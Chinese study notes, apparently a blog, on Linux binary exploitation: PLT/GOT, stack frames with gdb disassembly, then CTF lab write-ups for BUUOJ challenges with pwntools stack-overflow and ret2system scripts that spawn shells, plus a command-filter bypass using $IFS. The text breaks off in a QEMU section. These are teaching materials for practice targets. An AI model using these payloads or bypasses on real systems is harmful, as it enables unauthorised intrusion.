title="动态链接姐妹花PLT与GOT"></a>动态链接姐妹花PLT与GOT</h4><p>前面由一个简单的例子说明动态链接需要考虑的各种因素，但实际总结起来说两点：</p><blockquote><ul><li>需要存放外部函数的数据段</li><li>获取数据段存放函数地址的一小段额外代码</li></ul></blockquote><p>如果可执行文件中调用多个动态库函数，那每个函数都需要这两样东西，这样每样东西就形成一个表，每个函数使用中的一项。</p><p>总不能每次都叫这个表那个表，于是得正名。存放函数地址的数据表，称为<strong>重局偏移表</strong>（GOT, Global Offset Table），而那个额外代码段表，称为<strong>程序链接表</strong>（PLT，Procedure Link Table）。<strong>它们两姐妹各司其职，联合出手上演这一出运行时重定位好戏</strong>。</p><p>那么PLT和GOT长得什么样子呢？前面已有一些说明，下面以一个例子和简单的示意图来说明PLT&#x2F;GOT是如何运行的。</p><p>假设最开始的示例代码test.c增加一个write_file函数，在该函数里面调用glibc的write实现写文件操作。根据前面讨论的PLT和GOT原理，test在运行过程中，调用方（如print_banner和write_file)是如何通过PLT和GOT穿针引线之后，最终调用到glibc的printf和write函数的？</p><p>我简单画了PLT和GOT雏形图，供各位参考。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161610513.png" alt="image-20241016160853107"></p><p>当然这个原理图并不是Linux下的PLT&#x2F;GOT真实过程，Linux下的PLT&#x2F;GOT还有更多细节要考虑了。这个图只是将这些躁声全部消除，让大家明确看到PLT&#x2F;GOT是如何穿针引线的。</p><h2 id="进程执行"><a href="#进程执行" class="headerlink" title="进程执行"></a>进程执行</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161411482.png" alt="image-20241016141116434"></p><h3 id="程序装载和虚拟内存"><a href="#程序装载和虚拟内存" class="headerlink" title="程序装载和虚拟内存"></a>程序装载和虚拟内存</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161130221.png" alt="image-20241016113040172"></p><blockquote><p>段：程序加载到内存后，读写执行程序权限划分</p><p>节：功能区域划分</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161131942.png" alt="image-20241016113123886"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161133434.png" alt="image-20241016113326379"></p><blockquote><p>只占据了data和code</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161134292.png" alt="image-20241016113442250"></p><h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161141494.png" alt="imag e-20241016114135460"></p><blockquote><p>虚拟内存中有多个动态链接库，物理内存中只有一个</p><p>kernel虚拟内存中只有一个 </p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161149792.png" alt="image-20241016114959736"></p><h3 id="程序状态与汇编"><a href="#程序状态与汇编" class="headerlink" title="程序状态与汇编"></a>程序状态与汇编</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161421365.png" alt="image-20241016142115319"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410161425199.png" alt="image-20241016142526142"></p><h1 id="Linux函数调用栈的实现原理（X86）"><a href="#Linux函数调用栈的实现原理（X86）" class="headerlink" title="Linux函数调用栈的实现原理（X86）"></a>Linux函数调用栈的实现原理（X86）</h1><h2 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h2><p>二进制程序执行时的内存结构：</p><ul><li>code section：保存程序执行指令的机器码。</li><li>static section：在程序执行期间不改变的常量和静态变量。</li><li>heap：使用malloc申请的堆内存，向内存地址升序的方向生长：grows up。</li><li>stack：保存函数局部变量和函数调用的控制信息，向内存地址降序的方向生长：grows down。</li></ul><p><img src="https://i-blog.csdnimg.cn/blog_migrate/ffdc898adc5f461b71522585385ed12e.png" alt="在这里插入图片描述"></p><ul><li>（32位系统）程序的虚拟内存空间提供了2^32^ 的空间保存数据，用户地址空间3G从0x0000000到0xC0000000，内核空间1G从0xC0000000到0xFFFFFFFF。</li><li>（64位系统）程序的虚拟内存空间提供了2^64^ 的空间保存数据，用户地址空间128T从0x0000 0000 0000 0000到0x0000 7FFF FFFF F0000，内核空间128T从0xFFFF 8000 0000 0000到0xFFFF FFFF FFFF FFFF。</li></ul><h2 id="寄存器-1"><a href="#寄存器-1" class="headerlink" title="寄存器"></a>寄存器</h2><blockquote><p>寄存器提供了额外的存储空间，每个寄存器可以存一个字（4字节）。没有e拓展的寄存器只能存半个字（2字节）。</p><p>x86有六个通用寄存器和三个特殊寄存器</p></blockquote><p>和函数调用相关的寄存器（e表示扩展的意思）：</p><ul><li>eip：指令指针，存储当前正在执行的机器指令的地址。也叫PC（程序计数器）。</li><li>ebp：帧指针，保存当前栈帧顶部地址（高地址）。</li><li>esp：堆栈指针，保存当前堆栈底部地址（低地址）。</li></ul><p>下图便于理解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|  high address</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|-------frame----------|   # current frame     &lt;----- ebp</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |</span><br><span class="line">|        ...           |                       &lt;----- esp</span><br><span class="line">|----------------------|  low address</span><br></pre></td></tr></table></figure><h2 id="x86基础"><a href="#x86基础" class="headerlink" title="x86基础"></a>x86基础</h2><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151546319.png" alt="image-20241015154641104"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151548575.png" alt="image-20241015154845474"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151549071.png" alt="image-20241015154931881"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151554838.png" alt="image-20241015155442574"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151614658.png" alt="image-20241015161445539"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151612277.png" alt="image-20241015161241181"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151655740.png" alt="image-20241015165538660"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151656889.png" alt="image-20241015165649849"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151657508.png" alt="image-20241015165743268"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160011560.png" alt="image-20241016001130350"></p><blockquote><p>mov指令不支持两个数都来自主存</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160018028.png" alt="image-20241016001807867"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160022846.png" alt="image-20241016002254693"></p><h2 id="x86函数调用"><a href="#x86函数调用" class="headerlink" title="x86函数调用"></a>x86函数调用</h2><ul><li><p>当需要调用另一个函数时，栈空间需要生长，用来保存一些局部变量 或者 寄存器信息。</p></li><li><p>当调用函数发生时，caller执行逻辑会跳转到callee，拿到结果后，再跳转会caller。这就需要改变下面几个寄存器的值：</p></li></ul><p>​eip指令指针，需要改成指向callee的指令。<br>​ebp 和 esp 当前分别指向caller栈帧的顶部和底部。两个寄存器都需要更新为 指向callee的新栈帧的顶部和底部。</p><ul><li>当函数返回时，需要恢复寄存器中的旧值，才可以返回caller。所以更新寄存器的值，需要将它的旧值保存在堆栈中，以便在函数返回后恢复旧值。</li></ul><p>下面是main调用foo的执行过程：</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410160022220.png" alt="image-20241016002235173"></p><h3 id="step1：参数入栈"><a href="#step1：参数入栈" class="headerlink" title="step1：参数入栈"></a>step1：参数入栈</h3><p>将参数压入堆栈。 x86将参数压入堆栈来传递参数。请注意，当我们将参数压入堆栈时，<a href="https://so.csdn.net/so/search?q=esp&spm=1001.2101.3001.7020">esp</a> 会递减。参数以相反的顺序压入堆栈。（上面是高地址）</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151149015.png" alt="在这里插入图片描述"></p><h3 id="step2：旧的eip入栈"><a href="#step2：旧的eip入栈" class="headerlink" title="step2：旧的eip入栈"></a>step2：旧的eip入栈</h3><p>旧的eip（<a href="https://so.csdn.net/so/search?q=rip&spm=1001.2101.3001.7020">rip</a>）压入堆栈。跳转到子函数执行eip需要指向子函数，所以这里先保存下。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151156887.png" alt="在这里插入图片描述"></p><h3 id="step3：修改eip指向"><a href="#step3：修改eip指向" class="headerlink" title="step3：修改eip指向"></a>step3：修改eip指向</h3><p>已经保存了 eip 的旧值，可以安全地将 eip 更改为指向被callee的指令。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157476.png" alt="在这里插入图片描述"></p><h3 id="step4：将旧的ebp入栈"><a href="#step4：将旧的ebp入栈" class="headerlink" title="step4：将旧的ebp入栈"></a>step4：将旧的ebp入栈</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157859.png" alt="在这里插入图片描述"></p><h3 id="step5：ebp向下移动指向新栈帧顶部"><a href="#step5：ebp向下移动指向新栈帧顶部" class="headerlink" title="step5：ebp向下移动指向新栈帧顶部"></a>step5：ebp向下移动指向新栈帧顶部</h3><p>这就是<code>mov %esp %ebp</code>的含义：</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157009.png" alt="在这里插入图片描述"></p><h3 id="step6：esp向下移动"><a href="#step6：esp向下移动" class="headerlink" title="step6：esp向下移动"></a>step6：esp向下移动</h3><p>通过sub esp（esp地址–） 来为新栈帧分配新空间。编译器会根据函数的复杂度确定 esp 应该减少多少。</p><ul><li>例如，只有几个局部变量的函数不需要太多的堆栈空间，因此 esp 只会减少几个字节。</li><li>例如，如果一个函数将一个大数组声明为一个局部变量，那么 esp 会减少很多来适应堆栈中的数组。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151157157.png" alt="在这里插入图片描述"></p><h3 id="step7：执行callee"><a href="#step7：执行callee" class="headerlink" title="step7：执行callee"></a>step7：执行callee</h3><p>现在堆栈中已经保存了函数的局部变量和跳转控制信息；由于ebp指向栈帧的顶部，所以可以用ebp+8找到第一个参数的保存位置。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158821.png" alt="在这里插入图片描述"></p><h3 id="step8：返回esp回到堆栈顶部"><a href="#step8：返回esp回到堆栈顶部" class="headerlink" title="step8：返回esp回到堆栈顶部"></a>step8：返回esp回到堆栈顶部</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151414410.png" alt="image-20241015141436324"></p><h3 id="step9：恢复旧的ebp"><a href="#step9：恢复旧的ebp" class="headerlink" title="step9：恢复旧的ebp"></a>step9：恢复旧的ebp</h3><p>使用esp从堆栈中pop出一个值（old ebp），把old ebp的值赋给ebp。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151158831.png" alt="在这里插入图片描述"></p><h3 id="step10：弹出eip"><a href="#step10：弹出eip" class="headerlink" title="step10：弹出eip"></a>step10：弹出eip</h3><p>继续使用esp弹出old eip的值赋给eip。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415780.png" alt="image-20241015141502705"></p><h3 id="step11：从堆栈中删除参数"><a href="#step11：从堆栈中删除参数" class="headerlink" title="step11：从堆栈中删除参数"></a>step11：从堆栈中删除参数</h3><p>继续讲堆栈上的参数弹出到寄存器，然后删除esp栈顶以下的元素。栈顶以下的元素已经不在栈中，没有意义。</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151415222.png" alt="image-20241015141512169"></p><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    foo(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bar[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -O0 t.c -o t -g</span><br></pre></td></tr></table></figure><h3 id="main执行过程"><a href="#main执行过程" class="headerlink" title="main执行过程"></a>main执行过程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">3       int main(void) &#123;</span><br><span class="line">                                                                 # 由_start调入main函数</span><br><span class="line">   0x0000000000401122 &lt;+0&gt;:     55              push   %rbp      # 栈帧顶部入栈</span><br><span class="line">   0x0000000000401123 &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp # 栈帧顶部指针rbp指向新栈帧顶部</span><br><span class="line"></span><br><span class="line">4           foo(1, 2);</span><br><span class="line">=&gt; 0x0000000000401126 &lt;+4&gt;:     be 02 00 00 00  mov    $0x2,%esi # 参数1入寄存器传递</span><br><span class="line">   0x000000000040112b &lt;+9&gt;:     bf 01 00 00 00  mov    $0x1,%edi # 参数2入寄存器传递</span><br><span class="line">   0x0000000000401130 &lt;+14&gt;:    e8 07 00 00 00  callq  0x40113c &lt;foo&gt;   # push %rip 然后 jmpq</span><br><span class="line">                                                                        # push %rip 等价与 sub $0x8, %rsp </span><br><span class="line">                                                                        #                 mov $rip, %rsp</span><br><span class="line"></span><br><span class="line">   0x0000000000401135 &lt;+19&gt;:    b8 00 00 00 00  mov    $0x0,%eax</span><br><span class="line"></span><br><span class="line">5       &#125;</span><br><span class="line">   0x000000000040113a &lt;+24&gt;:    5d              pop    %rbp             # 先恢复rbp的值</span><br><span class="line">   0x000000000040113b &lt;+25&gt;:    c3              retq                    # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h3 id="foo函数"><a href="#foo函数" class="headerlink" title="foo函数"></a>foo函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble /rm</span><br><span class="line">Dump of assembler code for function foo:</span><br><span class="line">7       void foo(int a, int b) &#123;</span><br><span class="line">   0x000000000040113c &lt;+0&gt;:     55              push   %rbp              # 帧顶位置 入栈</span><br><span class="line">   0x000000000040113d &lt;+1&gt;:     48 89 e5        mov    %rsp,%rbp         # rbp帧顶指针，指向新帧顶</span><br><span class="line">   0x0000000000401140 &lt;+4&gt;:     89 7d ec        mov    %edi,-0x14(%rbp)  # 参数2入栈（先压最后一个参数入栈）</span><br><span class="line">   0x0000000000401143 &lt;+7&gt;:     89 75 e8        mov    %esi,-0x18(%rbp)  # 参数1入栈</span><br><span class="line"></span><br><span class="line">8           int bar[4];</span><br><span class="line">9       &#125;</span><br><span class="line">=&gt; 0x0000000000401146 &lt;+10&gt;:    90              nop</span><br><span class="line">   0x0000000000401147 &lt;+11&gt;:    5d              pop    %rbp  # 先恢复rbp的值</span><br><span class="line">   0x0000000000401148 &lt;+12&gt;:    c3              retq         # 在恢复rip的值 popq %rip</span><br><span class="line"></span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h1 id="ShellCode"><a href="#ShellCode" class="headerlink" title="ShellCode"></a>ShellCode</h1><p>作用：</p><ul><li>1.启动shell，进行交互</li><li>2.打开服务器端口等待连接</li><li>3.反向连接端口</li><li>4.。。。。</li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="实验一-nc的使用与系统命令执行"><a href="#实验一-nc的使用与系统命令执行" class="headerlink" title="实验一 nc的使用与系统命令执行"></a>实验一 nc的使用与系统命令执行</h2><blockquote><p>域名:端口号       如node5.buuoj.cn:27241<br>IP地址:端口号     如192.168.32.12:10001</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">连接远程端口获得文件信息</span></span><br><span class="line">nc node5.buuoj.cn 27241</span><br><span class="line">ll</span><br><span class="line">cat flag</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果设置了blacklist,那就要进行绕过过滤，$IFS<span class="variable">$9</span>可以替换空格</span></span><br><span class="line">l\l</span><br><span class="line">c\at$IFS$9flag</span><br></pre></td></tr></table></figure><h2 id="实验二-权限提升"><a href="#实验二-权限提升" class="headerlink" title="实验二 权限提升"></a>实验二 权限提升</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看文件基础信息</span></span><br><span class="line">checksec --file=Re_or_pwn</span><br><span class="line">file Re_or_pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">发现文件是64位的，使用IDA64打开反编译</span></span><br></pre></td></tr></table></figure><h2 id="实验三-向数组填充数据并简单写一个攻击脚本"><a href="#实验三-向数组填充数据并简单写一个攻击脚本" class="headerlink" title="实验三 向数组填充数据并简单写一个攻击脚本"></a>实验三 向数组填充数据并简单写一个攻击脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 编写attck.py文件，使用pwntools</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立远程连接</span></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25094</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>+p32(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 它的作用是将程序的标准输入和输出连接到当前的终端，允许你与目标程序进行交互。</span></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure><h2 id="实验四-栈溢出"><a href="#实验四-栈溢出" class="headerlink" title="实验四 栈溢出"></a>实验四 栈溢出</h2><h3 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h3><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141804606.png" alt="image-20241014180435394"></p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141800529.png" alt="栈在内存"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">|------------------|  &lt;- 高地址</span><br><span class="line">| 传入参数        |  &lt;- 参数存储区域</span><br><span class="line">|------------------|</span><br><span class="line">| EIP（返回地址）  |  &lt;- 被调用时保存的返回地址</span><br><span class="line">|------------------|</span><br><span class="line">| EBP              |  &lt;- 当前栈帧的基址</span><br><span class="line">|------------------|</span><br><span class="line">| 局部变量（数组）  |  &lt;- 数组存储区域</span><br><span class="line">| s[14]            |  &lt;- 数组的最后一个字节</span><br><span class="line">| s[13]            |</span><br><span class="line">| s[12]            |</span><br><span class="line">| s[11]            |</span><br><span class="line">| s[10]            |</span><br><span class="line">| s[9]             |</span><br><span class="line">| s[8]             |</span><br><span class="line">| s[7]             |</span><br><span class="line">| s[6]             |</span><br><span class="line">| s[5]             |</span><br><span class="line">| s[4]             |</span><br><span class="line">| s[3]             |</span><br><span class="line">| s[2]             |</span><br><span class="line">| s[1]             |</span><br><span class="line">| s[0]             |  &lt;- 数组的第一个字节</span><br><span class="line">|------------------|  &lt;- 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>返回地址就是EIP下一条指令的位置</p></blockquote><p>入口函数</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410141634119.png" alt="image-20241014163410051"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25760</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + p64(<span class="number">0x0000000000401186</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="实验五-栈溢出-利用system函数传参"><a href="#实验五-栈溢出-利用system函数传参" class="headerlink" title="实验五 栈溢出-利用system函数传参"></a>实验五 栈溢出-利用system函数传参</h2><h3 id="32程序"><a href="#32程序" class="headerlink" title="32程序"></a>32程序</h3><p>查看入口函数发现栈溢出漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151044138.png" alt="image-20241015104415044"></p><blockquote><p>buf字符数组有136个也就是0x88个，但是read能读入0x100个，有0x78个冗余空间，可以实现栈溢出</p></blockquote><p>寻找到提权函数，找到了string  &#x2F;bin&#x2F;sh 但是没有函数直接执行这个字符串，记录下这个字符串的地址，然后继续查找system函数，发现一个system函数能传入参数调用，因此目标就是利用只能溢出调用system函数并且传入参数</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151048132.png" alt="image-20241015104844088"></p><p>根据函数调用栈在内存中的结构，实现栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25269</span>)</span><br><span class="line"></span><br><span class="line">systemAddress=<span class="number">0x08048320</span></span><br><span class="line">shellAddress=<span class="number">0x0804A024</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(systemAddress) +p32(<span class="number">1</span>) + p32(shellAddress)</span><br><span class="line"></span><br><span class="line">p.readline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>x86使用栈返回</p><p>64使用寄存器返回</p></blockquote><p><code>分析payload</code></p><ul><li><code>b&#39;a&#39;*(0x88+4) </code> 覆盖char[]和ebp</li><li><code>p32(systemAddress)</code>覆盖返回地址</li><li><code>p32(1)</code>有leave，return，enter没有call，导致了错位一位，错失了eip保存，所以要添加一位代替eip的位置</li><li><code>p32(shellAddress)</code>传入的参数</li></ul><p>备用图片</p><p><img src="https://cdn.jsdelivr.net/gh/imatrwe/images/img/202410151051556.png" alt="image-20241015105133466"></p><h3 id="64位程序"><a href="#64位程序" class="headerlink" title="64位程序"></a>64位程序</h3><blockquote><p>32为程序参数在栈上，64位程序，函数的前6个参数在寄存器里</p><p>x86:参数都保存在栈上面</p><p>x64:前6个参数一次保存在RDI、RSI、RDX、RCX、R8和R9之中，如果还有更多的参数后保存在栈上</p></blockquote><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p><strong>面向返回编程</strong></p><h1 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">模拟不同架构的虚拟机</span></span><br><span class="line">qemu-system-xxxx</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机机器类型</span></span><br><span class="line">-M malta # MIPS架构机器类型</span><br><span class="line">-M vexpress-a9 # ARM架构机器类型</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定要加载的内核镜像文件</span></span><br><span class="line">-kernel vmlinuz-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定虚拟机硬盘</span></span><br><span class="line">-hda</span><br><span class="line">-dribe # 更灵活，可以指定虚拟硬盘属性</span><br><span class="line">-drive file=xxx.qcow2,if=sd,format=qcow2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定初始 RAM 磁盘（initramfs 或 initrd）映像文件,看映像中有没有</span></span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">向内核传递命令行参数，root指定根文件系统的位置，console指定控制台输出位置</span></span><br><span class="line">-append &quot;root=/dev/sda1 console=tyy0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/sda1指的是第一个 SCSI 或 SATA 磁盘的第一个分区，tyy0表示第一个虚拟终端设备</span></span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">/dev/mmcblk0p2表示第一个多媒体卡（MMC）或 SD 卡的块设备的第二个分区，ttyAMA0，表示第一个 ARM 串行设备，用于显示内核和系统启动过程的输出。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置虚拟网络接口的选项</span></span><br><span class="line">-net nic # 创建一个虚拟网络接口，使得虚拟机能够与外部网络或其他虚拟机通信。</span><br><span class="line">-net tap,ifname=tap0 # 创建一个 TAP 网络接口，并使用指定的接口名称tap0与虚拟机连接。</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span 